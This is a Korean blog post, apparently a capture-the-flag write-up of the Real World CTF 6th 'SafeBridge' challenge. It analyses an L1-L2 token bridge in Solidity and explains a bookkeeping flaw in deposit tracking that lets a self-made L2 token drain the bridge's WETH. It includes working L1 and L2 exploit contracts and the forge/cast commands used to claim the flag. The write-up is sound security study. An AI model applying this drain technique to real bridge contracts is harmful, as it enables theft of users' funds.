---
layout: post
title: 'Real World CTF 6th (SafeBridge)'
description: This article is about write-up for the Real World CTF 64th. there is only one web3.0 challenges, which contain incomplete verification and update of funds tracking variables between L1-L2 bridge contracts and thus fund drain (Unauthorized Token Drain) bug
date: 2024-01-29 02:00:53
author: anonymous
category: 'CTF'
---
## 개요

Real World CTF에 웹3 문제 있길래 풀어봤다. SafeBridge 문제의 솔브 조건은 L1 -> L2 브리지에서 토큰 잔액을 빼내는 것이었다. 이더리움에서 L1 -> L2 브리지는 주로 두 가지 계층 간의 상호 작용을 용이하게 하는 기술을 가리킨다.

```
contract Challenge {
    address public immutable BRIDGE;
    address public immutable MESSENGER;
    address public immutable WETH;

    constructor(address bridge, address messenger, address weth) {
        BRIDGE = bridge;
        MESSENGER = messenger;
        WETH = weth;
    }

    function isSolved() external view returns (bool) {
        return IERC20(WETH).balanceOf(BRIDGE) == 0;
    }
}
```
`Challenge.sol` 파일을 보면 `isSolved()` 함수가 있는데 WETH 토큰의 L1 브리지 잔액을 모두 빼내면 된다.

---
## Deploy.s.sol

```
function deploy(address system) internal returns (address challenge) {
        vm.createSelectFork(vm.envString("L1_RPC"));
        vm.startBroadcast(system);
        address relayer = getAdditionalAddress(0);
        L1CrossDomainMessenger l1messenger = new L1CrossDomainMessenger(relayer);
        WETH weth = new WETH();
        L1ERC20Bridge l1Bridge =
            new L1ERC20Bridge(address(l1messenger), Lib_PredeployAddresses.L2_ERC20_BRIDGE, address(weth));

        weth.deposit{value: 2 ether}();
        weth.approve(address(l1Bridge), 2 ether);
        l1Bridge.depositERC20(address(weth), Lib_PredeployAddresses.L2_WETH, 2 ether);

        challenge = address(new Challenge(address(l1Bridge), address(l1messenger), address(weth)));
        vm.stopBroadcast();
    }
```
문제 빌드는 `deploy.s.sol` 스크립트를 통해서 이루어진다. WETH 컨트랙트와 L1 브리지 컨트랙트를 생성하고, WETH 컨트랙트에 2 이더를 예치한다. 이후 L1 브리지 컨트랙트에 대해서 2 이더를 승인하고, L1 브리지 컨트랙트의 `depositERC20()` 함수를 통해서 L2_WETH로 2 이더만큼 이체한다.

---
## L1ERC20Bridge.sol 

```
function depositERC20(address _l1Token, address _l2Token, uint256 _amount) external virtual {
    _initiateERC20Deposit(_l1Token, _l2Token, msg.sender, msg.sender, _amount);
}

function depositERC20To(address _l1Token, address _l2Token, address _to, uint256 _amount) external virtual {
    _initiateERC20Deposit(_l1Token, _l2Token, msg.sender, _to, _amount);
}

function _initiateERC20Deposit(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)
    internal
{
    IERC20(_l1Token).safeTransferFrom(_from, address(this), _amount);

    bytes memory message;
    if (_l1Token == weth) {
        message = abi.encodeWithSelector(
            IL2ERC20Bridge.finalizeDeposit.selector, address(0), Lib_PredeployAddresses.L2_WETH, _from, _to, _amount
        );
    } else {
        message = abi.encodeWithSelector(IL2ERC20Bridge.finalizeDeposit.selector, _l1Token, _l2Token, _from, _to, _amount);
    }

    sendCrossDomainMessage(l2TokenBridge, message);
    deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] + _amount;

    emit ERC20DepositInitiated(_l1Token, _l2Token, _from, _to, _amount);
}
```
위 함수는 L1 브리지 컨트랙트의 디파짓 함수들이다. `_initiateERC20Deposit()` 함수가 위 2개의 예치 함수 내부에서 실행되는 되는데 먼저 _l1Token을 사용하여 현재 컨트랙트 주소로 amout 만큼의 토큰을 안전하게 전송하고, 조건에 따라서 `IL2ERC20Bridge.finalizeDeposit` 셀렉터와 관련된 정보를 인코딩해서 이를 `sendCrossDomainMessage()` 함수를 통해 L2로 메시지를 전송한다.

```
    function finalizeERC20Withdrawal(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)
        public
        onlyFromCrossDomainAccount(l2TokenBridge)
    {
        deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] - _amount;
        IERC20(_l1Token).safeTransfer(_to, _amount);
        emit ERC20WithdrawalFinalized(_l1Token, _l2Token, _from, _to, _amount);
    }

    /**
     * @inheritdoc IL1ERC20Bridge
     */
    function finalizeWethWithdrawal(address _from, address _to, uint256 _amount)
        external
        onlyFromCrossDomainAccount(l2TokenBridge)
    {
        finalizeERC20Withdrawal(weth, Lib_PredeployAddresses.L2_WETH, _from, _to, _amount);
    }
```
위 함수는 L1 브리지 내에 정의되어 있는데 L2로부터 받은 잔액 인출을 완료하는 함수이다.

---
## L2ERC20Bridge.sol

```
    function _initiateWithdrawal(address _l2Token, address _from, address _to, uint256 _amount) internal {
        IL2StandardERC20(_l2Token).burn(msg.sender, _amount);

        address l1Token = IL2StandardERC20(_l2Token).l1Token();
        bytes memory message;
        if (_l2Token == Lib_PredeployAddresses.L2_WETH) {
            message = abi.encodeWithSelector(IL1ERC20Bridge.finalizeWethWithdrawal.selector, _from, _to, _amount);
        } else {
            message = abi.encodeWithSelector(
                IL1ERC20Bridge.finalizeERC20Withdrawal.selector, l1Token, _l2Token, _from, _to, _amount
            );
        }

        sendCrossDomainMessage(l1TokenBridge, message);

        emit WithdrawalInitiated(l1Token, _l2Token, msg.sender, _to, _amount);
    }
```
위 함수는 L2에서 L1으로 다시 브리지하는 함수이다. _l2Token을 호출해서 l1Token 주소를 가져온다. 즉, 자체 토큰을 발행하고, l1Token 변수에 L1WETH 주소를 넣어주면 L1에 브리지할 수 있다. 그럼 L2 인출은 revert 되지 않고, L1으로 다시 중계된다.

```
    function finalizeERC20Withdrawal(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)
        public
        onlyFromCrossDomainAccount(l2TokenBridge)
    {
        deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] - _amount;
        IERC20(_l1Token).safeTransfer(_to, _amount);
        emit ERC20WithdrawalFinalized(_l1Token, _l2Token, _from, _to, _amount);
    }
```
그러나 자금 추적 변수에서 잔액을 업데이트 할 때, Underflow에 의해서 에러가 날 것이다. 이유는 자금 추적 변수에서 잔액을 차감하는데, 이때 [L1WETH][MyToken] 맵핑의 잔액은 0원이기 때문이다.

---
## Vuln Stuff

```
function _initiateERC20Deposit(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)
    internal
{
    IERC20(_l1Token).safeTransferFrom(_from, address(this), _amount);

    bytes memory message;
    if (_l1Token == weth) {
        message = abi.encodeWithSelector(
            IL2ERC20Bridge.finalizeDeposit.selector, address(0), Lib_PredeployAddresses.L2_WETH, _from, _to, _amount
        );
    } else {
        message = abi.encodeWithSelector(IL2ERC20Bridge.finalizeDeposit.selector, _l1Token, _l2Token, _from, _to, _amount);
    }

    sendCrossDomainMessage(l2TokenBridge, message);
    deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] + _amount;

    emit ERC20DepositInitiated(_l1Token, _l2Token, _from, _to, _amount);
}
```
그러나 L1 브리지 컨트랙트의 `_initiateERC20Deposit()` 함수 내에서 _l1Token == weth일 경우, L2_WETH로 브리지 하게 되는데, 이후 자금 추적을 위한 데이터를 업데이트할 때,  _l1Token == weth 조건에 대해서 예외 처리가 있지 않아 L2_WETH로 브리지가 되더라도 실제로는 _l2Token 잔액이 업데이트 된다. 이를 통해서 자체 토큰을 L1 Weth에 예치하고, 자체 토큰의 잔액을 업데이트할 수 있다.

이렇게 되면 L2 -> L1으로 브리지를 할 때, 자체 토큰의 맵핑이 0이 아니기 때문에 Underflow 발생하지 않아 자금을 정상적으로 공격자의 주소로 인출할 수 있다.

---
## Exploit Code

### L1 Exploit

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import {Script, console2} from "../lib/forge-std/src/Script.sol";
import {WETH} from "./L1/WETH.sol";
import {Challenge} from "./Challenge.sol";
import {L1ERC20Bridge} from "./L1/L1ERC20Bridge.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Ex1 is Script{
    Challenge chall;
    L1ERC20Bridge L1ERC20Bri;
    WETH weth;

    address chall_addr = 0x350A48Fff5C5da93b157fCF682F5421b69983a51;
    address ptoken = 0x1faDE8edd7079E4ECD9b22F96FFC3C6d05662090;
    constructor() {
        chall = Challenge(chall_addr);
    }

    function exploit() public payable {
        address L1_ERC20_BRIDGE = chall.BRIDGE();
        address WETH_ADDR = chall.WETH();
        console2.log("WETH ADDR : ", WETH_ADDR);

        L1ERC20Bri = L1ERC20Bridge(L1_ERC20_BRIDGE);
        weth = WETH(payable(WETH_ADDR));

        weth.deposit{value : 2 ether}();
        weth.approve(L1_ERC20_BRIDGE, 2 ether);
        L1ERC20Bri.depositERC20To(address(weth), address(ptoken), address(ptoken), 2 ether);
        //console2.log(IERC20(WETH_ADDR).balanceOf(L1_ERC20_BRIDGE));
    }
}
```

### L2 Exploit

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "./L2/L2ERC20Bridge.sol";
import "./L2/standards/L2WETH.sol";
import {L2ERC20Bridge} from "./L2/L2ERC20Bridge.sol";

contract Ex2 is L2StandardERC20 {
    address L2_ERC20_BRIDGE = 0x420000000000000000000000000000000000baBe;
    address L2_WETH = payable(0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000);
    L2ERC20Bridge L2ERC20Bri;
    
    constructor() L2StandardERC20(address(0), "POCAS", "POCAS") {
        L2ERC20Bri = L2ERC20Bridge(L2_ERC20_BRIDGE);
    }

    function exploit(address WETH) public {
        l1Token = WETH;
        _mint(address(this), 2 ether);
        L2WETH(Lib_PredeployAddresses.L2_WETH).approve(L2_ERC20_BRIDGE , 2 ether);
        L2ERC20Bri.withdraw(L2_WETH, 2 ether);

        L2StandardERC20(address(this)).approve(L2_ERC20_BRIDGE , 2 ether);
        L2ERC20Bri.withdraw(address(this), 2 ether);
    }
}
```

### Result

```
> Exploit
forge create Ex2 --rpc-url $RU --private-key $PRIVATE_KEY
forge script --broadcast --rpc-url $RU --private-key $PRIVATE_KEY Solve -vv
cast send "0x1faDE8edd7079E4ECD9b22F96FFC3C6d05662090" --rpc-url $RU --private-key $PRIVATE_KEY "exploit(address)" "0xe517aE54a43ad512b0106498Ca249398ea9c4972"

❯ nc 47.251.56.125 1337
team token? 314HNMkxQs6cYkLy2HSkaw==
1 - launch new instance
2 - kill instance
3 - get flag
action? 3
rwctf{yoU_draINED_BriD6E}
```

---
## ETC

- [정리 내용](https://p0cas.notion.site/Real-World-CTF-6th-dc5f9ba379614e2f90db4c22025e21ce?pvs=4)

![](https://media.discordapp.net/attachments/962997469757702177/1201691555648524358/image.png?ex=65cabd79&is=65b84879&hm=b7328e05b14016e327d8bad8c64a39c243c9cdcc8a59d43800f1582b32b9e90f&=&format=webp&quality=lossless&width=1900&height=1146)

문제 풀 때 코드 내에 주석 달아가면서 흐름을 하나 하나 파악하면서 풀어서 그런지 코드들이 지저분하다. 어렵다.. 접을 까 고민 중